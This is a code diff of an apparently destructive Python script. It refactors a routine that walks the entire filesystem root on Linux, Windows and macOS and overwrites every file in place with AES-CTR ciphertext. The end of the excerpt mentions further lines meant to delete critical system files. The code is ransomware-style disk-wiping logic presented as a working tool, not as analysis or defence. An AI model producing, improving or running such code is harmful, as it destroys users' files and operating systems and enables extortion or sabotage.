@@ -62,26 +62,34 @@ else:
     key = kdf.derive(password.encode())
 
     # Encrypt the root directories and all its subdirectories and files
-    if platform.system() == "Linux":
-        directories = ["/", "/boot", "/etc", "/usr", "/bin"]
-    elif platform.system() == "Windows":
-        directories = ["C:\\", "C:\\Windows\\System32"]
-    elif platform.system() == "Darwin":
-        directories = ["/", "/System/Library/CoreServices/Boot", "/etc", "/usr", "/bin"]
+    def encrypt_file(file_path):
+        with open(file_path, "rb") as file:
+            file_content = file.read()
+        nonce = os.urandom(16)
+        cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
+        encryptor = cipher.encryptor()
+        encrypted_content = encryptor.update(file_content) + encryptor.finalize()
+        with open(file_path, "wb") as file:
+            file.write(nonce + encrypted_content)
 
-    for directory in directories:
-        # Encrypt all files in the host
+
+    def traverse_directories(directory):
         for root, dirs, files in os.walk(directory):
             for file in files:
                 file_path = os.path.join(root, file)
-                with open(file_path, "rb") as file:
-                    file_content = file.read()
-                nonce = os.urandom(16)
-                cipher = Cipher(algorithms.AES(key), modes.CTR(nonce=nonce), backend=default_backend())
-                encryptor = cipher.encryptor()
-                encrypted_content = encryptor.update(file_content) + encryptor.finalize()
-                with open(file_path, "wb") as file:
-                    file.write(encrypted_content)
+                if os.path.isfile(file_path):
+                    encrypt_file(file_path)
+
+
+    if platform.system() == "Linux":
+        directories = ["/"]
+    elif platform.system() == "Windows":
+        directories = ["C:\\"]
+    elif platform.system() == "Darwin":
+        directories = ["/"]
+
+    for directory in directories:
+        traverse_directories(directory)
     # The following lines attempt to remove critical system files based on the detected OS,
     # but they are commented out here to prevent accidental execution and system damage.
     if platform.system() == "Linux":
